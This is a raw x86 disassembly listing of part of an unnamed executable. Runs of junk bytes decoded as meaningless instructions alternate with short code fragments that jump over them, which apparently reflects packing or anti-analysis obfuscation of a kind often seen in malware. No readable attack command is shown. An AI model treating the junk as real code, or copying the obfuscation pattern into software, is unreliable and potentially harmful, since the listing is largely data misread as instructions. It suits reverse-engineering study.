  4072e8:	outs   dx,BYTE PTR ds:[esi]
  4072e9:	xchg   edi,eax
  4072ea:	popa   
  4072eb:	ret    0xee65
  4072ee:	(bad)  
  4072ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072f0:	fsubr  DWORD PTR [ebx-0x2a42f157]
  4072f6:	icebp  
  4072f7:	cdq    
  4072f8:	push   0xf2b69b60
  4072fd:	xor    al,BYTE PTR [esi-0x24]
  407300:	pop    ebx
  407301:	jge    0x407303
  407303:	loopne 0x4072d5
  407305:	xadd   BYTE PTR [esi+0x2a],ah
  407309:	or     dl,0x4d
  40730c:	sub    eax,0xfae75ebf
  407311:	ror    DWORD PTR [ebx],cl
  407313:	inc    ecx
  407314:	repz (bad) 
  407317:	sub    esp,DWORD PTR [eax-0x4795bc79]
  40731d:	dec    ecx
  40731e:	call   0xfcbdb6c7
  407323:	mov    bl,0xc2
  407325:	ret    
  407326:	(bad)  
  407327:	sti    
  407328:	(bad)  
  40732b:	popf   
  40732c:	mov    BYTE PTR [ebx-0x6],ah
  40732f:	push   esp
  407330:	xor    BYTE PTR [esi-0x35ff48d],dl
  407336:	xor    eax,0x8ec05a75
  40733b:	adc    ch,BYTE PTR [ecx]
  40733d:	iret   
  40733e:	xor    al,0x89
  407340:	pop    eax
  407341:	sub    BYTE PTR [eax-0x7dcffbc2],ch
  407347:	gs pushf 
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x40739c
  407387:	repnz iret 
  407389:	push   0xa
  40738b:	ret    0x7e7e
  40738e:	add    eax,0xf77e7e7c
  407393:	jno    0x407336
  407395:	arpl   WORD PTR [eax+ebx*1-0x13531a97],bp
  40739c:	push   ebp
  40739d:	sti    
  40739e:	fwait
  40739f:	inc    eax
  4073a0:	scas   al,BYTE PTR es:[edi]
  4073a1:	dec    edi
  4073a2:	xor    dh,BYTE PTR [ecx+eax*2+0x5ab5f340]
  4073a9:	jb     0x40735d
  4073ab:	sub    edx,DWORD PTR [edx+0x457b6e59]
  4073b1:	sar    BYTE PTR [edi],cl
  4073b3:	jnp    0x407368
  4073b5:	mov    edi,0xb715fd
  4073ba:	outs   dx,DWORD PTR ds:[esi]
  4073bb:	sub    al,0x11
  4073bd:	mov    cs,WORD PTR [ecx+0xcf04a04]
  4073c3:	int    0x98
  4073c5:	fbstp  TBYTE PTR [edi]
  4073c7:	jne    0x4073cf
  4073c9:	inc    esi
  4073ca:	iret   
  4073cb:	pop    es
  4073cc:	data16 adc BYTE PTR [edx-0x5a],bh
  4073d0:	fisttp QWORD PTR [eax+edi*2-0x3eb535da]
  4073d7:	bnd ja 0x407381
  4073da:	xchg   ecx,eax
  4073db:	push   ebp
  4073dc:	push   es
  4073dd:	cli    
  4073de:	and    ebx,eax
  4073e0:	arpl   WORD PTR [edx+0x2a],ax
  4073e3:	xchg   ecx,eax
  4073e4:	cmp    al,cl
  4073e6:	jbe    0x4073d9
  4073e8:	lock jb 0x407377
  4073eb:	add    eax,0xf6ab2c36
  4073f0:	push   ecx
  4073f1:	cdq    
  4073f2:	idiv   DWORD PTR [eax-0x4e555a0e]
  4073f8:	sbb    DWORD PTR [ebx-0x12a9e576],ebp
  4073fe:	dec    ecx
  4073ff:	xor    eax,edi
  407401:	mov    esi,0x3d91e254
  407406:	sub    ebx,DWORD PTR [edi+0x3e]
  407409:	aas    
  40740a:	mov    dh,0x26
  40740c:	mov    edx,DWORD PTR [edx-0x2ac41a68]
  407412:	bound  edx,QWORD PTR [edi+0x11]
  407415:	jbe    0x407445
  407417:	lock sbb DWORD PTR [ebx-0x4fb0adcd],eax
  40741e:	sbb    BYTE PTR [eax],ch
  407420:	xor    DWORD PTR [edx],0x6ef84233
  407426:	cmp    BYTE PTR ds:0xea1c1462,dl
  40742c:	xchg   esp,eax
  40742d:	mov    eax,ds:0xa6f001a4
  407432:	mov    bh,0xb8
  407434:	jbe    0x407479
  407436:	cmp    al,0x66
  407438:	fstp   DWORD PTR [ebp+esi*1+0xca98bc8]
  40743f:	hlt    
  407440:	add    al,0x1f
  407442:	mov    ah,0x3a
  407444:	in     eax,0xc2
  407446:	or     al,0xeb
  407448:	test   eax,0xa6f7339f
  40744d:	icebp  
  40744e:	mov    dh,0xd6
  407450:	or     al,0x11
  407452:	lea    esp,[ecx]
  407454:	jle    0x407423
  407456:	clc    
  407457:	push   ds
  407458:	sub    ah,BYTE PTR ds:0x6cf2b27
  40745e:	sbb    BYTE PTR [eax-0x5eb4c83],dl
  407464:	mov    ecx,DWORD PTR [ecx+0x9aaf60c]
  40746a:	jne    0x4074be
  40746c:	or     ecx,DWORD PTR [esi+0x5d4df3ea]
  407472:	add    al,0x2
  407474:	retf   0x48c8
  407477:	mov    ss,WORD PTR [ecx+0x5b36a801]
  40747d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40747e:	cmp    al,0xa
  407480:	jae    0x407429
  407482:	loop   0x4074ac
  407484:	pop    ebx
  407485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407486:	dec    ah
  407488:	sub    ebp,esp
  40748a:	push   ss
  40748b:	(bad)  
  40748c:	fdivr  st(2),st
  40748e:	aaa    
  40748f:	pop    edi
  407490:	loope  0x40750f
  407492:	xor    DWORD PTR [ebp-0x497176de],edi
  407498:	add    ebx,DWORD PTR [ecx]
  40749a:	or     al,0xcf
  40749c:	pop    edi
  40749d:	push   ebx
  40749e:	inc    edi
  40749f:	mov    ecx,0x58b0b177
  4074a4:	inc    edx
  4074a5:	ficomp WORD PTR [edi-0xdccc4ca]
  4074ab:	jno    0x4074ac
  4074ad:	fnstcw WORD PTR [edi]
  4074af:	sbb    bh,BYTE PTR [ebx]
  4074b1:	add    eax,0x76f14568
  4074b6:	sar    DWORD PTR [esi+0x7a],0xce
  4074ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074bb:	outs   dx,DWORD PTR ds:[esi]
  4074bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074bd:	sub    BYTE PTR [edx-0x15],0x3d
  4074c1:	test   eax,0x881edf58
  4074c6:	popa   
  4074c7:	xchg   ecx,eax
  4074c8:	and    eax,0xbe0cc9fc
  4074cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074ce:	adc    eax,0x94cb09d0
  4074d3:	inc    ebp
  4074d4:	dec    esi
  4074d5:	dec    edi
  4074d6:	retf   0xcd01
  4074d9:	or     dl,BYTE PTR [edi]
  4074db:	xchg   edi,eax
  4074dc:	lods   eax,DWORD PTR ds:[esi]
  4074dd:	xchg   esi,eax
  4074de:	jne    0x407481
  4074e0:	(bad)  [esp+eax*2-0x1a]
  4074e4:	push   eax
  4074e5:	mov    ebp,0x9583ffeb
  4074ea:	add    DWORD PTR ds:0xac3b36fc,ecx
  4074f0:	into   
  4074f1:	and    eax,0x12d03374
  4074f6:	mov    ebx,0x351a0daf
  4074fb:	xchg   ebp,eax
  4074fc:	hlt    
  4074fd:	dec    esp
  4074fe:	mov    ch,BYTE PTR [edx+0xf298f8c]
  407504:	bnd jmp 0x40751e
  407507:	inc    esi
  407508:	test   DWORD PTR [ebx+0x23422106],esi
  40750e:	fisttp DWORD PTR [edx-0x6408143b]
  407514:	(bad)  
  407515:	outs   dx,BYTE PTR ds:[esi]
  407516:	xchg   ebp,eax
  407517:	push   ss
  407518:	xor    al,0xd2
  40751a:	mov    esp,0x48142050
  40751f:	ja     0x407574
  407521:	pop    ss
  407522:	xchg   ebp,eax
  407523:	mov    eax,ds:0x4eea7469
  407528:	and    ebp,DWORD PTR [esi+0x31dc06e8]
  40752e:	out    dx,al
  40752f:	xor    BYTE PTR [eax],dh
  407531:	popa   
  407532:	test   ecx,0x1c8df28d
  407538:	(bad)  [ecx+edi*8]
  40753b:	xor    BYTE PTR [esi],al
  40753d:	leave  
  40753e:	pop    ebp
  40753f:	int3   
  407540:	out    dx,eax
  407541:	mov    esp,0xdf1dd967
  407546:	inc    eax
  407547:	lahf   
  407548:	sub    al,0xd7
  40754a:	pop    esi
  40754b:	mov    ebx,0x6682d4aa
  407550:	pop    ds
  407551:	mov    al,0x9e
  407553:	add    ch,ah
  407555:	cld    
  407556:	cmp    dh,BYTE PTR ds:0x57e1a8e6
  40755c:	clc    
  40755d:	jle    0x40755a
  40755f:	icebp  
  407560:	or     al,0xdc
  407562:	inc    ebp
  407563:	mov    ah,0x3d
  407565:	sbb    al,0x82
  407567:	mov    ds:0xb3a2717f,al
  40756c:	aas    
  40756d:	cmc    
  40756e:	ins    DWORD PTR es:[edi],dx
  40756f:	cld    
  407570:	sbb    DWORD PTR [eax-0x56],edx
  407573:	test   eax,0x49de7c05
  407578:	mov    ebx,DWORD PTR [ecx+eiz*1-0x462b6194]
  40757f:	pcmpeqd mm3,QWORD PTR [esi+eax*4+0x7e]
  407584:	aad    0xdb
  407586:	arpl   WORD PTR [ecx-0x642b12a3],sp
  40758c:	enter  0x3db6,0x4e
  407590:	mov    bl,0x4a
  407592:	adc    bh,bl
  407594:	lock sbb eax,0x38040619
  40759a:	int3   
  40759b:	jnp    0x407566
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	dec    esp
  407656:	pop    es
  407657:	gs pop ebx
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0x6b7e7e7c
  407662:	iret   
  407663:	adc    DWORD PTR [eax-0x70],ebx
  407666:	sahf   
  407667:	fwait
  407668:	leave  
  407669:	(bad)  
  40766a:	pop    ebp
  40766b:	(bad)  
  40766c:	addr16 mov ah,0xcd
  40766f:	inc    esp
  407670:	or     BYTE PTR [edi+0x2294b28d],dl
  407676:	and    esi,DWORD PTR ds:0x992ed0a4
  40767c:	mov    DWORD PTR [eax+0x65d6423d],ebx
  407682:	(bad)
  407685:	scas   eax,DWORD PTR es:[edi]
  407686:	mov    BYTE PTR [eax],0xc8
  407689:	adc    eax,0xf92b1339
  40768e:	pop    edx
  40768f:	adc    DWORD PTR [edi+0x6e],ebx
  407692:	mov    al,0xf0
  407694:	aad    0xa7
  407696:	(bad)  
  407697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407698:	dec    esp
  407699:	dec    ecx
  40769a:	mov    dl,0x2e
  40769c:	loop   0x4076b1
  40769e:	jmp    0xfe9:0xfab44061
  4076a5:	jmp    0x407656
  4076a7:	add    al,0x77
  4076a9:	push   0x6326ed6c
  4076ae:	div    DWORD PTR [ecx-0xf44c46a]
  4076b4:	push   esp
  4076b5:	jne    0x4076d5
  4076b7:	push   ecx
  4076b8:	lahf   
  4076b9:	adc    bh,ch
  4076bb:	clc    
  4076bc:	rcr    DWORD PTR [edx],cl
  4076be:	sub    BYTE PTR [ebp+0x6ce5d2],ch
  4076c4:	pop    ds
  4076c5:	jmp    0x898f:0xb64639f7
  4076cc:	cli    
  4076cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076ce:	fisubr DWORD PTR [ebx]
  4076d0:	rol    DWORD PTR [ecx],0xfc
  4076d3:	and    esp,ebp
  4076d5:	inc    esp
  4076d6:	mov    ds:0x58c6ef1,eax
  4076db:	add    DWORD PTR [edi+ebp*4+0x7f],edx
  4076df:	xor    BYTE PTR ds:0x9458962b,0xe1
  4076e6:	xor    DWORD PTR [esi-0x5d76bb07],edx
  4076ec:	out    0xa3,eax
  4076ee:	push   es
  4076ef:	loop   0x4076f6
  4076f1:	jo     0x407684
  4076f3:	xchg   DWORD PTR [edx+0x2b052a45],ecx
  4076f9:	pop    eax
  4076fa:	or     al,0x2c
  4076fc:	pushf  
  4076fd:	adc    DWORD PTR [eax+0x13294f96],ecx
  407703:	dec    ecx
  407704:	adc    dl,BYTE PTR [esp+edi*8+0x19]
  407708:	fld    QWORD PTR [ecx-0x41]
  40770b:	adc    eax,DWORD PTR [edi+0x32]
  40770e:	cmp    ecx,eax
  407710:	cmp    dl,BYTE PTR [edx-0x1553f28b]
  407716:	xchg   esp,eax
  407717:	pop    ebp
  407718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407719:	or     BYTE PTR [edx+0x6b6f460b],ah
  40771f:	lea    ebx,[edx]
  407721:	mov    eax,ds:0xdba90be2
  407726:	call   0x3dd90bc9
  40772b:	rcr    BYTE PTR [eax],cl
  40772d:	enter  0xd0da,0x4d
  407731:	mov    edi,0x36e44bc5
  407736:	jp     0x4077ae
  407738:	test   al,0xc5
  40773a:	imul   ecx,DWORD PTR [eax],0xffffffdd
  40773d:	stc    
  40773e:	popf   
  40773f:	sbb    eax,0x21fce4ba
  407744:	dec    BYTE PTR [eax+ebp*4+0x63]
  407748:	ret    0x45fd
  40774b:	sbb    al,0xd4
  40774d:	arpl   WORD PTR [esi-0xe5b480a],si
  407753:	fs jne 0x407730
  407756:	cmp    DWORD PTR [ebx+0x47],esp
  407759:	jnp    0x40774d
  40775b:	retf   0x29fa
  40775e:	mov    cl,0x28
  407760:	je     0x4077d7
  407762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407763:	lods   eax,DWORD PTR ds:[esi]
  407764:	loop   0x4077bd
  407766:	jp     0x407707
  407768:	dec    ecx
  407769:	test   eax,0xdb6f7463
  40776e:	ins    DWORD PTR es:[edi],dx
  40776f:	iret   
  407770:	and    BYTE PTR [esi],0xd4
  407773:	lods   al,BYTE PTR ds:[esi]
  407774:	cld    
  407775:	and    al,0xff
  407777:	inc    BYTE PTR [ecx]
  407779:	fwait
  40777a:	lahf   
  40777b:	xor    eax,0x296dfcd9
  407780:	in     al,dx
  407781:	add    dh,cl
  407783:	xchg   ecx,eax
  407784:	lea    esi,[ebp+0x32816dfb]
  40778a:	mov    bl,0x50
  40778c:	pop    ebp
  40778d:	cli    
  40778e:	jbe    0x40774b
  407790:	mov    edx,0xc45b2f34
  407795:	push   DWORD PTR [eax+esi*4+0x17]
  407799:	ret    0x5976
  40779c:	mov    ecx,0x35bdfe8f
  4077a1:	push   esi
  4077a2:	arpl   dx,si
  4077a4:	test   BYTE PTR [edx-0x401f1e99],al
  4077aa:	dec    eax
  4077ab:	inc    edx
  4077ac:	loopne 0x4077fd
  4077ae:	xchg   esi,eax
  4077af:	mov    edi,0x3ab8ffa
  4077b4:	imul   ebp,DWORD PTR [edi-0x10],0xffffff8d
  4077b8:	sub    al,0x3a
  4077ba:	popf   
  4077bb:	mov    esi,0x31f2f0e3
  4077c0:	int3   
  4077c1:	stos   BYTE PTR es:[edi],al
  4077c2:	lods   al,BYTE PTR ds:[esi]
  4077c3:	cmc    
  4077c4:	and    eax,esp
  4077c6:	xor    ah,dh
  4077c8:	jp     0x407772
  4077ca:	push   edi
  4077cb:	sbb    esp,DWORD PTR [eax]
  4077cd:	sub    esp,eax
  4077cf:	iret   
  4077d0:	mov    esi,0xa2cd5ec9
  4077d5:	fbld   TBYTE PTR [edi]
  4077d7:	dec    eax
  4077d8:	mov    ds:0xa634293f,eax
  4077dd:	lods   al,BYTE PTR ds:[esi]
  4077de:	sbb    edi,ecx
  4077e0:	iret   
  4077e1:	push   ecx
  4077e3:	jge    0x407848
  4077e5:	ss push ebp
  4077e7:	inc    edx
  4077e8:	push   esi
  4077e9:	es pop edx
  4077eb:	or     al,0x53
  4077ed:	dec    ecx
  4077ee:	in     eax,0x14
  4077f0:	repz les esi,FWORD PTR [esi-0x5740a66a]
  4077f7:	dec    ebx
  4077f8:	or     eax,0x63f13ff3
  4077fd:	or     DWORD PTR [eax+0x5],esi
  407800:	cdq    
  407801:	cld    
  407802:	push   esp
  407803:	mov    esi,0xcf06508
  407808:	aas    
  407809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40780a:	mov    BYTE PTR [edx],ah
  40780c:	(bad)  
  40780d:	scas   eax,DWORD PTR es:[edi]
  40780e:	lea    esp,[esi+0x78]
  407811:	cmp    eax,0x385d8d2b
  407816:	pop    es
  407817:	lahf   
  407818:	es int 0xab
  40781b:	dec    eax
  40781c:	xor    esi,DWORD PTR [edi-0xc2f0122]
  407822:	repnz pop eax
  407824:	pop    ss
  407825:	pop    es
  407826:	sub    DWORD PTR [ebx-0x16aa4c4a],0xf03e5b52
  407830:	jo     0x4077ec
  407832:	pop    ds
  407833:	ds sbb eax,0xcbeff23b
  407839:	xor    al,BYTE PTR [ecx-0x2127aa9e]
  40783f:	sub    ebx,edi
  407841:	fwait
  407842:	mov    dh,0xeb
  407844:	aad    0x91
  407846:	push   eax
  407847:	add    cl,cl
  407849:	outs   dx,DWORD PTR ds:[esi]
  40784a:	mov    al,ds:0x1d32e69d
  40784f:	sti    
  407850:	call   0xd74:0x303c0abf
  407857:	dec    eax
  407858:	jmp    FWORD PTR [eax+edx*2-0x4e]
  40785c:	fs or  ecx,edi
  40785f:	push   edi
  407860:	imul   ebx,DWORD PTR [ebp-0x4c495f6c],0x38
  407867:	xor    dl,BYTE PTR [ecx+0x5690c612]
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x84,eax
  407922:	adc    bl,BYTE PTR [edx+0x7c]
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0x6c7e7e7c
  40792e:	out    0x4,al
  407930:	in     al,0xc
  407932:	test   eax,0x9ca8a38f
  407937:	pop    ss
  407938:	aaa    
  407939:	or     dh,BYTE PTR [ebx+0x27]
  40793c:	imul   eax,ebx,0x40fc4e01
  407942:	pop    es
  407943:	dec    esi
  407944:	add    eax,0x3a53330c
  407949:	ret    
  40794a:	call   0xd277:0x735b3fae
  407951:	ja     0x4079b9
  407953:	mov    ?,WORD PTR [edi]
  407955:	scas   eax,DWORD PTR es:[edi]
  407956:	push   cs
  407957:	je     0x407995
  407959:	mov    eax,0x36172874
  40795e:	adc    eax,0x81089013
  407963:	fld    DWORD PTR [eax+0x53]
  407966:	addr16 int 0x98
  407969:	mov    ds:0xc54e47ba,eax
  40796e:	sbb    cl,BYTE PTR [ecx-0x4b8efa6e]
  407974:	sahf   
  407975:	cmp    eax,0x91f1c7f5
  40797a:	lea    edx,[ebp-0x6d1a00e2]
  407980:	add    eax,0x5c578d0e
  407985:	ins    BYTE PTR es:[edi],dx
  407986:	jb     0x407a00
  407988:	and    ebx,DWORD PTR [ebx-0x14eeeaf3]
  40798e:	loope  0x407a0f
  407990:	push   0xe4f413b3
  407995:	dec    ebp
  407996:	scas   eax,DWORD PTR es:[edi]
  407997:	int    0xc1
  407999:	or     edi,eax
  40799b:	cmp    esi,0x59
  40799e:	pop    eax
  40799f:	jecxz  0x407937
  4079a1:	out    0x93,eax
  4079a3:	inc    BYTE PTR [ebp-0x2de7b1c]
  4079a9:	mov    ah,0x98
  4079ab:	scas   eax,DWORD PTR es:[edi]
  4079ac:	mov    esi,DWORD PTR [ebp-0x1]
  4079af:	xchg   esi,eax
  4079b0:	inc    ecx
  4079b1:	addr16 inc edi
  4079b3:	pop    esi
  4079b4:	addr16 inc esi
  4079b6:	pop    ebp
  4079b7:	aad    0xae
  4079b9:	neg    BYTE PTR [ebx+0x80e4cad]
  4079bf:	and    edi,DWORD PTR [edi+0x4b]
  4079c2:	jecxz  0x407a0f
  4079c4:	icebp  
  4079c5:	jp     0x4079d4
  4079c7:	(bad)  
  4079c8:	in     eax,dx
  4079c9:	repnz pop edi
  4079cb:	popa   
  4079cc:	lods   eax,DWORD PTR ds:[esi]
  4079cd:	mov    edx,0x3a3bf00f
  4079d2:	stos   DWORD PTR es:[edi],eax
  4079d3:	call   0xa20bf3a4
  4079d8:	shl    DWORD PTR [edi+0x2c],cl
  4079db:	or     eax,0xcd98bdcd
  4079e0:	mov    bh,0x26
  4079e2:	jnp    0x407a2a
  4079e4:	sub    DWORD PTR [esi-0x169db667],esi
  4079ea:	je     0x407998
  4079ec:	sti    
  4079ed:	jbe    0x407a55
  4079ef:	lock jmp 0xe3cbf017
  4079f5:	shl    DWORD PTR [ecx],1
  4079f7:	sub    al,0x58
  4079fa:	jno    0x4079e8
  4079fc:	bnd ja 0x4079e5
  4079ff:	xor    edi,DWORD PTR [edi-0x4f099b17]
  407a05:	xchg   ebx,eax
  407a06:	das    
  407a07:	mov    esi,0xe0ed6adc
  407a0c:	pop    esi
  407a0d:	cwde   
  407a0e:	clc    
  407a0f:	push   es
  407a10:	in     eax,0xa0
  407a12:	jo     0x4079fa
  407a14:	enter  0x4a64,0x51
  407a18:	sub    DWORD PTR [edx],eax
  407a1a:	xor    edi,edx
  407a1c:	or     al,0xa6
  407a1e:	and    esi,DWORD PTR [edi+0x7102d50]
  407a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a25:	test   DWORD PTR [edi-0x5d],0x8f80bec4
  407a2c:	aas    
  407a2d:	imul   ebp,DWORD PTR [edx],0x9b143fa9
  407a33:	je     0x407a2e
  407a35:	pop    ebp
  407a36:	test   eax,0xa100960c
  407a3b:	push   ss
  407a3c:	pushf  
  407a3d:	leave  
  407a3e:	mov    ds:0x6d7b12ee,al
  407a43:	sub    esi,eax
  407a45:	xchg   ebp,eax
  407a46:	lahf   
  407a47:	inc    ecx
  407a48:	js     0x407a5a
  407a4a:	mov    bh,0x53
  407a4c:	(bad)  
  407a4d:	cwde   
  407a4e:	inc    eax
  407a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a50:	push   edi
  407a51:	retf   0x2ff9
  407a54:	xchg   ebx,eax
  407a55:	ret    0xf269
  407a58:	mov    eax,0x15c0a3e6
  407a5d:	mov    ss,WORD PTR cs:[edi+0xc2fdf53]
  407a64:	ins    DWORD PTR es:[edi],dx
  407a65:	(bad)  
  407a66:	push   ds
  407a67:	push   0xc1dbb004
  407a6c:	fmul   st,st(7)
  407a6e:	xchg   ebx,eax
  407a6f:	or     al,0xbd
  407a71:	inc    ebp
  407a72:	push   ds
  407a73:	cmp    al,0xbe
  407a75:	push   0x1f23ef80
  407a7a:	repz cmc 
  407a7c:	pop    edi
  407a7d:	frstor [ebx-0x2f]
  407a80:	ret    
  407a81:	jmp    0xa737df25
  407a86:	push   ss
  407a87:	xor    BYTE PTR [eax-0x46],0x60
  407a8b:	adc    ecx,DWORD PTR [edx]
  407a8d:	loop   0x407ab7
  407a8f:	mov    al,ds:0xc4c804f0
  407a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a95:	inc    edi
  407a96:	pop    ebp
  407a97:	int3   
  407a98:	push   eax
  407a99:	mov    cl,0xbf
  407a9b:	mov    ch,0x18
  407a9d:	or     DWORD PTR [eax-0x51],edx
  407aa0:	mov    esi,0xb6d2ab40
  407aa5:	jle    0x407a72
  407aa7:	neg    DWORD PTR [edx]
  407aa9:	shl    DWORD PTR [edx],cl
  407aab:	out    0x59,eax
  407aad:	jb     0x407aeb
  407aaf:	aas    
  407ab0:	imul   ebp,DWORD PTR [esi-0x3adce1e8],0xffffffad
  407ab7:	inc    ebp
  407ab8:	jge    0x407a7f
  407aba:	or     BYTE PTR [ebp-0x48],ch
  407abd:	test   DWORD PTR [esi],ebx
  407abf:	enter  0x1434,0xaf
  407ac3:	xor    DWORD PTR [eax+0x39],ebx
  407ac6:	in     eax,0x95
  407ac8:	and    eax,ebp
  407aca:	xchg   ecx,eax
  407acb:	cmp    eax,0xe43a58e0
  407ad0:	pop    ds
  407ad1:	mov    esi,0x1ebe72f4
  407ad6:	xchg   esi,eax
  407ad7:	cmc    
  407ad8:	(bad)  
  407ad9:	cli    
  407ada:	es retf 0xad88
  407ade:	retf   0xec5c
  407ae1:	sub    DWORD PTR [ebx+eiz*1+0x12e0d3c],edx
  407ae8:	pop    ebp
  407ae9:	xchg   ebp,eax
  407aea:	js     0xf8ccd248
  407af0:	jle    0x407a7a
  407af2:	push   ebx
  407af3:	mov    bl,0x45
  407af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af6:	dec    esp
  407af7:	inc    ecx
  407af8:	in     eax,0xe1
  407afa:	sti    
  407afb:	mov    al,0x70
  407afd:	mov    dl,BYTE PTR [esi+0x7d2c7cf2]
  407b03:	push   esi
  407b04:	cmp    eax,edx
  407b06:	ror    edx,1
  407b08:	or     al,0xd2
  407b0a:	sbb    DWORD PTR [ebx-0x5833d341],edi
  407b10:	enter  0xa40d,0x97
  407b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b15:	jbe    0x407b5e
  407b17:	lods   al,BYTE PTR ds:[esi]
  407b18:	fiadd  WORD PTR [ebp+0x78]
  407b1b:	gs mov eax,0x810416ce
  407b21:	ret    0x7545
  407b24:	out    0xaa,al
  407b26:	(bad)  
  407b27:	hlt    
  407b28:	test   eax,0xee64eecd
  407b2d:	iret   
  407b2e:	ins    BYTE PTR es:[edi],dx
  407b2f:	int    0x80
  407b31:	cmp    BYTE PTR [edi-0x79],bl
  407b34:	xchg   ebx,eax
  407b35:	dec    edi
  407b36:	cli    
  407b37:	dec    ecx
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x4336ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
